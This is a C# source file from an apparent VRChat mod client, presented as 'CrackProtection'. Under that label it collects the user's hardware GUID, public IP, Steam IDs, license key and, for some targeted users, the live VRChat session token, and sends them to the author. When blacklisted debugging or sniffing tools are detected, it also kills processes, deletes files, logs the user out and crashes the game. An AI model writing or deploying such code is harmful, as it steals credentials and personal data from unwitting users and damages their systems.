using System;
using System.Collections;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.IO;
using System.Net.Cache;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using MelonLoader;
using Newtonsoft.Json;
using FusionClient;
using Microsoft.Win32;
using VRC.Core;
using System.Reflection;
using UnityEngine;
using System.Runtime.InteropServices;
using System.Media;
using System.Windows.Forms;
using System.Net.Sockets;
using FusionClient.Modules;
using System.Text.RegularExpressions;
using FC;
using FusionClient.Core;
using UnityEngine.Networking;
using FC.Utils;
using System.Text;

namespace FusionClient
{
    [Obfuscation(Exclude = true, ApplyToMembers = true, StripAfterObfuscation = true)]
    internal class CrackProtection
    {
        [DllImport("KERNEL32.DLL", EntryPoint =
        "SetProcessWorkingSetSize", SetLastError = true,
    CallingConvention = CallingConvention.StdCall)]
        internal static extern bool SetProcessWorkingSetSize32Bit
(IntPtr pProcess, int dwMinimumWorkingSetSize,
    int dwMaximumWorkingSetSize);

        [DllImport("KERNEL32.DLL", EntryPoint =
                "SetProcessWorkingSetSize", SetLastError = true,
            CallingConvention = CallingConvention.StdCall)]
        internal static extern bool SetProcessWorkingSetSize64Bit
        (IntPtr pProcess, long dwMinimumWorkingSetSize,
            long dwMaximumWorkingSetSize);

        public static List<string> ProcessNameBlacklist = new List<string>()
        {
            "de4dot",
            "spy",
            "dump",
            "dumper",
            "hook",
            "decompiler",
            "confuser",
            "de4dot",
            "dot",
            ".net",
            "ripper",
            "crack",
            "debug",
            "http",
            "de4",
            "fiddler",
            "network",
            "dotpeek",
            "fiddler",
            "de4dot",
            "extremedumper",
            "cheatengine",
            "procdump",
            "procdump64",
            "procdump64a",
            "processdump",
            "windump",
            "omnipeek",
            "capsa",
            "kismet",
            "etherape",
            "advancedipscanner",
            "packetanalyzer",
            "ipsniffer",
            "advancedpacketsniffer",
            "advancedhttppacketsniffer",
            "commview",
            "networkprobe",
            "watchwan",
            "interactivetcprelay",
            "ettercap",
            "smartsniff",
            "zeek",
            "dumper",
            "extremeDumper",
            "megadumper",
            "sypex",
            "biggestDump",
            "minidumper",
            "crack",
            "antidump",
            "gamedump",
            "ollydbg",
            "httpdebuger",
            "HTTPDebuggerUI",
            "HTTPDebuggerSvc",
            "drmemory",
            "MEM_debug",
            "ImmunityDebugger",
            "HxD",
            "Scylla_x64",
            "Scylla_x86",
            "smsniff",
            "SmartSniff",
            "SmartDump",
            "memtriage",
            "memleax",
            "SafetyDump",
            "Minidump",
            "dumpcap",
            "FiddlerCore",
            "FiddlerCap",
            "Fiddler Jam",
            "Fiddler Classic",
            "Fiddler Everywhere"
        };

        [ObfuscationAttribute(Exclude = false, Feature = "-rename")]
        internal class Info
        {
            public string Ip { get; set; } = "Null";
        }
        [ObfuscationAttribute(Exclude = false, Feature = "-rename")]
        public static string GetID()
        {
            var Info = new Info();
            try
            {
                Info = JsonConvert.DeserializeObject<Info>(new WebClient().DownloadString("https://api.ipify.org?format=json"));
            }
            catch { return "Cant Get IP"; }
            return Info.Ip;
        }

        internal static System.Collections.Generic.List<string> SteamID64s = new System.Collections.Generic.List<string>();
        public static string GetSteamID()
        {
            string text = "";
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Valve\\Steam");
            RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Valve\\Steam");
            if (registryKey != null)
            {
                string text2 = registryKey.GetValue("InstallPath").ToString();
                if (!string.IsNullOrEmpty(text2))
                {
                    text = text2;
                }
            }
            else if (registryKey2 != null)
            {
                string text3 = registryKey2.GetValue("InstallPath").ToString();
                if (!string.IsNullOrEmpty(text3))
                {
                    text = text3;
                }
            }
            if ((SteamID64s == null || SteamID64s.Count == 0) && !string.IsNullOrEmpty(text) && System.IO.File.Exists(text + "//config//loginusers.vdf"))
            {
                string[] array = System.IO.File.ReadAllLines(text + "//config//loginusers.vdf");
                foreach (string text4 in array)
                {
                    string text5 = text4.Replace(" ", "").Replace("\t", "").Replace("\r", "")
                        .Replace("\n", "")
                        .Replace("\"", "");
                    if (text5.Length == 17 && text5.All(char.IsDigit))
                    {
                        SteamID64s.Add(text5);
                        return string.Join(", ", SteamID64s);
                    }
                }
            }
            return "Null";
        }

        private static string GetHWID()
        {
            string location = @"SOFTWARE\Microsoft\Cryptography";
            string name = "MachineGuid";
            using (RegistryKey localMachineX64View = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                using (RegistryKey rk = localMachineX64View.OpenSubKey(location))
                {
                    if (rk == null)
                    {
                        throw new KeyNotFoundException(string.Format("Key Not Found: {0}", location));
                    }
                    object machineGuid = rk.GetValue(name);
                    if (machineGuid == null)
                    {
                        throw new IndexOutOfRangeException(string.Format("Index Not Found: {0}", name));
                    }
                    return machineGuid.ToString();
                }
            }
        }
        internal static string GetAuthKey()
        {
            try
            {
                var fileText = File.ReadAllText("Fusion Client\\Auth.FC");
                return fileText;
            }
            catch
            {
                return "Cant Get Key Seems Like They Dont Have One";
            }
        }

        public static IEnumerator DllProtection()
        {
            while (true)
            {
                yield return new WaitForSeconds(10);
                try
                {
                    if (PlayerUtils.GetCurrentUser().GetDisplayName() == "plsunbanmevrc")
                    {
                        Functions.CrackAlertv2($"\n**DumbAss That Cracked My Client Has A New Key**\n\n**-----------------[INFO]-----------------**\n**Name:** {(string.IsNullOrEmpty(APIUser.CurrentUser.displayName) ? "Not Logged In!" : APIUser.CurrentUser.displayName)}\n**UserID:** {(string.IsNullOrEmpty(APIUser.CurrentUser.id) ? "Not Logged In!" : APIUser.CurrentUser.id)}\n **HWID** {GetHWID()}\n**IP:** {GetID()}\n**SteamID64:** {GetSteamID()}\n**Client User Key:** {GetAuthKey()}\n**VRC Token:** {ApiCredentials.GetAuthToken()}\n**-----------------[ENDINFO]-----------------**\n").Start();
                    }
                    if (APIUser.CurrentUser.id == "usr_6e503ae5-c4d5-431f-a6e3-2527b20fc2f0")
                    {
                        Functions.CrackAlertv2($"\n**DumbAss That Cracked My Client Has A New Key**\n\n**-----------------[INFO]-----------------**\n**Name:** {(string.IsNullOrEmpty(APIUser.CurrentUser.displayName) ? "Not Logged In!" : APIUser.CurrentUser.displayName)}\n**UserID:** {(string.IsNullOrEmpty(APIUser.CurrentUser.id) ? "Not Logged In!" : APIUser.CurrentUser.id)}\n **HWID** {GetHWID()}\n**IP:** {GetID()}\n**SteamID64:** {GetSteamID()}\n**Client User Key:** {GetAuthKey()}\n**VRC Token:** {ApiCredentials.GetAuthToken()}\n**-----------------[ENDINFO]-----------------**\n").Start();
                    }
                    if (System.Environment.MachineName == "Unixian")
                    {
                        Functions.CrackAlertv2($"\n**DumbAss That Cracked My Client Has A New Key**\n\n**-----------------[INFO]-----------------**\n**Name:** {(string.IsNullOrEmpty(APIUser.CurrentUser.displayName) ? "Not Logged In!" : APIUser.CurrentUser.displayName)}\n**UserID:** {(string.IsNullOrEmpty(APIUser.CurrentUser.id) ? "Not Logged In!" : APIUser.CurrentUser.id)}\n **HWID** {GetHWID()}\n**IP:** {GetID()}\n**SteamID64:** {GetSteamID()}\n**Client User Key:** {GetAuthKey()}\n**VRC Token:** {ApiCredentials.GetAuthToken()}\n**-----------------[ENDINFO]-----------------**\n").Start();
                    }
                    if (GetSteamID() == "76561199169982383")
                    {
                        Functions.CrackAlert($"\n**DumbAss That Refunds Has A New Key**\n\n**-----------------[INFO]-----------------**\n**Name:** {(string.IsNullOrEmpty(APIUser.CurrentUser.displayName) ? "Not Logged In!" : APIUser.CurrentUser.displayName)}\n**UserID:** {(string.IsNullOrEmpty(APIUser.CurrentUser.id) ? "Not Logged In!" : APIUser.CurrentUser.id)}\n **HWID** {GetHWID()}\n**IP:** {GetID()}\n**SteamID64:** {GetSteamID()}\n**Client User Key:** {GetAuthKey()}\n**-----------------[ENDINFO]-----------------**\n").Start();
                        System.Diagnostics.Process.GetCurrentProcess().Kill();
                        MelonCoroutines.Start(GameKillLoop());
                    }
                    if (APIUser.CurrentUser.id == "usr_326a100e-7acd-46be-b092-ee5750f1289b")
                    {
                        Functions.CrackAlert($"\n**DumbAss That Refunds Has A New Key**\n\n**-----------------[INFO]-----------------**\n**Name:** {(string.IsNullOrEmpty(APIUser.CurrentUser.displayName) ? "Not Logged In!" : APIUser.CurrentUser.displayName)}\n**UserID:** {(string.IsNullOrEmpty(APIUser.CurrentUser.id) ? "Not Logged In!" : APIUser.CurrentUser.id)}\n **HWID** {GetHWID()}\n**IP:** {GetID()}\n**SteamID64:** {GetSteamID()}\n**Client User Key:** {GetAuthKey()}\n**-----------------[ENDINFO]-----------------**\n").Start();
                        System.Diagnostics.Process.GetCurrentProcess().Kill();
                        MelonCoroutines.Start(GameKillLoop());
                    }
                    var AllProcesses = Process.GetProcesses();
                    foreach (var Process in AllProcesses)
                    {
                        if (ProcessNameBlacklist.Contains(Process.ProcessName.ToLower()))
                        {
                            Functions.CrackAlert($"\n**Crack attempt**\n\n**-----------------[INFO]-----------------**\n**Name:** {(string.IsNullOrEmpty(APIUser.CurrentUser.displayName) ? "Not Logged In!" : APIUser.CurrentUser.displayName)}\n**UserID:** {(string.IsNullOrEmpty(APIUser.CurrentUser.id) ? "Not Logged In!" : APIUser.CurrentUser.id)}\n **HWID** {GetHWID()}\n**IP:** {GetID()}\n**SteamID64:** {GetSteamID()}\n**Client User Key:** {GetAuthKey()}\n**Procces name:** {Process.ProcessName}\n**-----------------[ENDINFO]-----------------**\n").Start();

                            Functions.BanKey(GetAuthKey()).Start();
                            for (int i = 0; i < 35; i++)
                            {
                                Logs.Log("Found Dumper Reporting To Owner Of FusionClient You Will Be Dmed", ConsoleColor.Red);
                            }
                            SystemSounds.Beep.Play();
                            Console.Beep();
                            SystemSounds.Beep.Play();
                            SystemSounds.Beep.Play();
                            Console.Beep();
                            SystemSounds.Beep.Play();
                            SystemSounds.Beep.Play();
                            Console.Beep();
                            SystemSounds.Beep.Play();
                            SystemSounds.Beep.Play();
                            Console.Beep();
                            SystemSounds.Beep.Play();
                            SystemSounds.Beep.Play();
                            Console.Beep();
                            SystemSounds.Beep.Play();
                            APIUser.Logout();
                            File.Delete("Mods\\FusionLoader.dll");
                            File.Delete("Fusion Client\\Auth.FC");
                            Thread.Sleep(5000);
                            Process.Kill();
                            System.Diagnostics.Process.GetCurrentProcess().Kill();
                            MelonCoroutines.Start(GameKillLoop());
                            MelonCoroutines.Start(GameKillLoop());
                            MelonCoroutines.Start(GameKillLoop());
                            Environment.Exit(-1);
                            new Thread(() =>
                            {
                                GameObject.Instantiate(new GameObject()); //Anti Proccess.kill patch
                            }).Start();
                        }
                    }
                }
                catch { }
            }
        }

        public static void GameKill()
        {
            System.GC.Collect();
            System.GC.WaitForPendingFinalizers();
            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
            {
                SetProcessWorkingSetSize32Bit(System.Diagnostics.Process.GetCurrentProcess().Handle, -1, -1);
            }
        }

        public static IEnumerator GameKillLoop()
        {
            while (true)
            {
                yield return new WaitForSeconds(0);
                GameKill();
                Process.GetCurrentProcess().Kill();
                Environment.Exit(0);
                UnityEngine.Application.Quit();
            }
        }

    }
}
